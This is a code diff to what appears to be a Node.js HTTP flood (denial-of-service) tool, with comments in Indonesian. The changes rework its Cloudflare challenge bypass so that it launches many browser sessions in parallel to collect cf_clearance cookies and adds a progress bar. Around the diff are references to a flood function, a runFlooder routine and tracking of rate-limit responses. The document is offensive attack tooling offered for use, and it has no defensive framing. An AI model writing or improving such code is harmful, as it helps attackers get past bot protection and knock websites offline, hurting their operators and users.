@@ -64,6 +64,18 @@ let currentRate = args.Rate;
 let last429Time = 0;
 let consecutive429 = 0;
 
+// ─── Progress tracker untuk cookie bypass ────────────────────────────────────
+let bypassProgress = { done: 0, success: 0, total: 0 };
+
+function printBypassProgress() {
+    process.stdout.write(
+        `\r\x1b[33m[CF Bypass] Progress: \x1b[32m${bypassProgress.success}\x1b[33m OK / ` +
+        `\x1b[36m${bypassProgress.done}\x1b[33m done / ` +
+        `\x1b[35m${bypassProgress.total}\x1b[33m total\x1b[0m   `
+    );
+}
+// ─────────────────────────────────────────────────────────────────────────────
+
 function flood(userAgent, cookie) {
     try {
         let parsed = url.parse(args.target);
@@ -203,8 +215,6 @@ async function bypassCloudflareOnce(attemptNum) {
     let page = null;
     
     try {
-        console.log("\x1b[33m[CF Bypass] Attempt " + attemptNum + "...\x1b[0m");
-        
         const response = await connect({
             headless: false,
             turnstile: true,
@@ -227,11 +237,9 @@ async function bypassCloudflareOnce(attemptNum) {
         browser = response.browser;
         page = response.page;
         
-        console.log("\x1b[33m[CF Bypass] Accessing " + args.target + "...\x1b[0m");
-        
         await page.goto(args.target, { waitUntil: 'domcontentloaded', timeout: 60000 });
         
-        // Tunggu challenge selesai
+        // Poll sampai cf_clearance muncul atau timeout
         let challengeCompleted = false;
         let checkCount = 0;
         
@@ -253,16 +261,20 @@ async function bypassCloudflareOnce(attemptNum) {
         
         if (browser) await browser.close();
         
+        // Update progress
+        bypassProgress.done++;
         if (cfClearance) {
-             console.log("\x1b[32m[CF Bypass] Success! Got cf_clearance\x1b[0m");
-             return { cookies, userAgent, success: true };
+            bypassProgress.success++;
+            printBypassProgress();
+            return { cookies, userAgent, success: true };
         } else {
-             console.log("\x1b[31m[CF Bypass] Failed - No cf_clearance\x1b[0m");
-             return { cookies: [], userAgent, success: false };
+            printBypassProgress();
+            return { cookies: [], userAgent, success: false };
         }
         
     } catch (error) {
-        console.log("\x1b[31m[CF Bypass] Error: " + error.message + "\x1b[0m");
+        bypassProgress.done++;
+        printBypassProgress();
         if (browser) {
             try { await browser.close(); } catch(e) {}
         }
@@ -270,15 +282,24 @@ async function bypassCloudflareOnce(attemptNum) {
     }
 }
 
+// ─── PARALLEL bypass: semua browser jalan sekaligus ──────────────────────────
 async function bypassCloudflareParallel(totalCount) {
-    console.log("\x1b[35m429 BYPASS - CONCURRENT 50\x1b[0m");
-    const results = [];
-    
-    for(let i = 0; i < totalCount; i++) {
-        const res = await bypassCloudflareOnce(i + 1);
-        if(res.success) results.push(res);
-        if(results.length >= totalCount) break;
-    }
+    console.log("\x1b[35m429 BYPASS SYSTEM - CONCURRENT 50\x1b[0m");
+    console.log(`\x1b[33m[CF Bypass] Launching ${totalCount} browser(s) in parallel...\x1b[0m`);
+
+    bypassProgress = { done: 0, success: 0, total: totalCount };
+    printBypassProgress();
+
+    // Jalankan semua sekaligus (Promise.all = paralel sejati)
+    const promises = Array.from({ length: totalCount }, (_, i) =>
+        bypassCloudflareOnce(i + 1)
+    );
+
+    const allResults = await Promise.all(promises);
+    const results = allResults.filter(r => r && r.success);
+
+    // Baris baru setelah progress bar
+    process.stdout.write("\n");
 
     if (results.length === 0) {
         console.log("\x1b[31mFailed to get CF cookies. Using fallback.\x1b[0m");
@@ -287,9 +308,13 @@ async function bypassCloudflareParallel(totalCount) {
             userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
             success: true
         });
+    } else {
+        console.log(`\x1b[32m[CF Bypass] Done! ${results.length}/${totalCount} sessions berhasil.\x1b[0m`);
     }
+
     return results;
 }
+// ─────────────────────────────────────────────────────────────────────────────
 
 function runFlooder() {
     const bypassInfo = global.bypassData[Math.floor(Math.random() * global.bypassData.length)];
